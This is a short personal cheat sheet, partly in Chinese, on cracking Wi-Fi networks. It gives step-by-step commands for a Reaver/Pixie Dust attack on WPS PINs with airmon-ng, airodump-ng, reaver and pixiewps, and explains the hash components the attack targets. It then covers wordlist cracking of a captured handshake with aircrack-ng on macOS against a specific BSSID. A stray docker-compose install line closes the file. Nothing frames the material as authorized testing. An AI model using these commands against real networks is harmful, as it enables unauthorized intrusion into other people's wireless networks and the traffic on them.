## aircrack 

- aircrack-ng 无线密码破解
- aireplay-ng 流量生成和客户端认证
- airodump-ng 数据包捕获
- airbase-ng  虚假接入点配置
- airmon-ng 启动监听
## reaver &pixie DIst Attack

1. airmon-ng start wlan0
if get any error, try following solution:

    1. Put the device in Monitor mode Airmon-ng start wlan0
    2. A monitoring interface will be started on wlan0mon
    3. Use iwconfig to check if the interface MODE is in managed mode, if so then change it to monitor instead of managed with the following commands:
    ifconfig wlan0mon down
    iwconfig wlan0mon mode monitor
    ifconfig wlan0mon up
    1. iwconfig check if the mode is monitoring mode now
    2. airodump-ng wlan0mon

2. Start airodump-ng to get the BSSID, MAC address and channel of our target.

`airodump-ng -i wlan0mon`

3. Now pick the target and use the BSSID and the channel for Reaver:
We need the PKE, PKR, e-hash 1 & e-hash 2, E-nonce / R-nonce and the authkey from Reaver to use for pixiewps.

   `Reaver -i wlan0mon -b [BSSID] -vv -S -c [AP channel]`

4. Now start pixiewps with the following arguments:
   ![](wlan%20attack/2018-10-06-15-18-14.png)
    Components:
    –E-Hash1 is a hash in which we brute force the first half of the WPS PIN.

    –E-Hash2 is a hash in which we brute force the second half of the WPS PIN.

    –HMAC is a function that hashes all the data in parenthesis. The function is HMAC-SHA-256.

    –PSK1 is the first half of the router’s WPS PIN (10,000 possibilities)

    –PSK2 is the second half of the router’s WPS PIN (1,000 or 10,000 possibilities depending if we want to compute the checksum. We just do 10,000 because it makes no time difference and it’s just easier.)

    –PKE is the Public Key of the Enrollee (used to verify the legitimacy of a WPS exchange and prevent replays.)

    –PKR is the Public Key of the Registrar (used to verify the legitimacy of a WPS exchange and prevent replays.)
## mac 下破解Wi-Fi

* 安装`aircrack-ng`
* 创建airport连接
* sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
* `/airport -s` scan wifi
* `airport card sniff 信道`
* 破解 aircrack-ng -w password.txt -b c8:3a:35:30:3e:c8 /tmp/*.cap

sudo curl -L https://github.com/docker/compose/releases/download/1.17.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
